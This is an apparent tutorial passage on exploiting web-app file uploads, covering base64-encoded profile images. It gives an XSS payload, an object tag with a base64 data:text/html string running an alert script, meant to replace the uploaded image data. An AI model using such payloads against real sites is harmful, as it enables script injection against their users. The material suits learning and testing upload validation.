## Introduction

File upload is a common features in different web app. In this passage, we would discuss how to exploit web app via file upload in several scenario:

### 1 Image Upload
Image upload can be commonly seen in different web app. Especially for some web app with social network, a profile pic upload is crucial. There are several ways to exploit via image upload:

#### 1.1 Exploiting base64-encoded image
In some web app, they use base64-enceded image. If so, the pic you uploaded would look something like below:-

```html
<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADcAAAA3CAAAAACNsI2aAAAACXBIWXMAAAB5AAAAeQBPsriEAAAB6ElEQVR42rVWO46EMAzNadAcY3vaOQMXoXcXKZehS8NpqNxamw8JxDYra1Zjhgge9jhx/By7bYvtl4Y8Qn+tEjty6WxuQ0KkfOM5wJEeEkT1bsigU+xGQV+QfZ2ned0LAkLnyQ4XV2XB/k+jXdTs8Mc1+UlvQehEt5Fit7hLFsUfqfOk3d1lJ9VO+qN1sFvJm+IScB7s3uo8ZVzC8RrsXjIuqp2n0d+sxFNbHxCw9cF34yn2L5jyJWndIprzRfqLpvw0+6PCh1fjgxpP5NL4VzlYEa6zOYDgzyvk0cMbykMek6THipSXAD5/BKh8H/3JGZTxPgM9Px9WDL0CkM1ORJie48nsWAXQ8kW1YxlknKfIWJs/EBXgoZ6Jf2KMNMYz4FgBJjTGkxR/H67vm/H8eP9ShlyRqfli24c0svy0zLNXgOkNtQJEle/P/MPOv8T3TGZIZIbO7sL7BMON74nkuQqUj4XvnMvwiNCBjO+yev2NVDtZLeX5rvD9lu0zauxW+a6dBvJ8H5Gyfzz3wIBkO57rYECyHeeWF+xW+YcT47Jkdzi4TpT+lPNdIv9Z34fxNOxf0PhO91yw5MuMen56AxLPOtG7W9T63SCQ2k9Uol1so3bVnrog2JTyU57n1bb37n3s5s8Of5RfsaTdSlfuyUAAAAA8dEVYdGNvbW1lbnQAIEltYWdlIGdlbmVyYXRlZCBieSBHTlUgR2hvc3RzY3JpcHQgKGRldmljZT1wbm1yYXcpCvqLFvMAAABKdEVYdHNpZ25hdHVyZQA4NWUxYWU0YTJmYmE3OGVlZDRmZDhmMGFjZjIzNzYwOWU4NGY1NDk2Y2RlMjBiNWQ3NmM5Y2JjMjk4YzRhZWJjJecJ2gAAAABJRU5ErkJggg==">
```

If this is the case, we can try to exploit by changing the data whilst upload to below:

```html
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+Cg==">
```

The above codes is an XSS payload encoded using base64. Given no input validation, the above payload would pop a box in your browser. 

